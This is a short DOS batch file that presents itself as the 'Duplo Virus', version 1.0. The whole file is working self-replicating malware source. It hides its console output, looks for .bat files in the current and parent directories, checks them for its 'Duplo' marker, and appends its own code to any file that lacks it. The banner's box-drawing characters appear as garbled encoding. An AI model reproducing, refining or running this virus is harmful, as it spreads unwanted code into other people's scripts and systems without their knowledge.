@echo off
echo 旼컴컴컴컴컴컴컴컴컴컴�
echo �    Duplo Virus      �
echo 읕컴컴컴컴컴컴컴컴컴컴�
@pause
@ctty nul
:Duplo Virus!
for %%a in (*.bat) do set Duplo=%%a
for %%b in (%duplo% ..\%duplo%) do find "Duplo" %%b
if not errorlevel 1 goto blocktwo
type %0 >> %duplo%
goto duplo
:blocktwo
exit
:THIS IS SMALL VIRUS VERSION 1.0.
